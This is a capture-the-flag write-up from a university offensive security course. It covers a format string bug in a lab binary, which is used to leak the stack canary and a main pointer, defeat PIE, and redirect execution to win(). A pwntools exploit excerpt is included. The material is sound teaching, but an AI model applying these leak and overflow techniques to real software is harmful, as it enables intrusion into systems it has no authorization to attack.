# Space Station

**Category:** pwn / format string leak, canary + PIE bypass · **Course:** Offensive Security (PoliTo)

## Challenge

PIE is enabled on this build, so a plain hardcoded `win()` address won't work. `vuln()` again pipes user input straight into `printf`, then reads a second, larger buffer.

## Vulnerability

Same `printf(buf)` format string bug as Pastry Shop, but this time it's used to leak *two* values in one request: the stack canary and a code pointer into `main`, which together defeat both the stack protector and ASLR/PIE in a single round trip.

## Exploitation

1. Send `%15$lx.%17$lx` to leak the canary (stack slot 15) and a saved return address into `main` (slot 17) in one line, then split the response on `.`.
2. Recover the PIE base by subtracting the leaked pointer's known static offset (`0x139e`) from the leaked `main` address.
3. Build the overflow with the correct canary, then a PIE-relative `ret` gadget (`0x101a`) for stack alignment and the PIE-relative address of `win()`.

As in `solve.py`:

```python
p.sendline(f"%{CANARY_IDX}$lx.%{LEAK_MAIN_IDX}$lx".encode())   # idx 15 . idx 17
canary_str, main_str = p.recvline().strip().decode().split(".")
canary      = int(canary_str, 16)
leaked_main = int(main_str, 16)

PIE_base = leaked_main - 0x139e

payload = flat(
    b"A" * OFFSET_TO_CANARY,
    p64(canary),
    b"B" * (OFFSET_TO_RIP - OFFSET_TO_CANARY - 8),
    p64(PIE_base + ret_gadgetoffset),   # PIE-relative ret, stack alignment
    p64(PIE_base + exe.sym.win),
)
```

## Files

- `main.c` — challenge source
- `Makefile` — build recipe (`-fPIE -pie -fstack-protector-all -Wno-format-security`: canary enabled, position-independent)
- `space_station` — compiled challenge binary
- `solve.py` — working exploit (pwntools)

## Flag

`offsec{...redacted...}` — captured against the remote instance; redacted here per standard write-up etiquette.
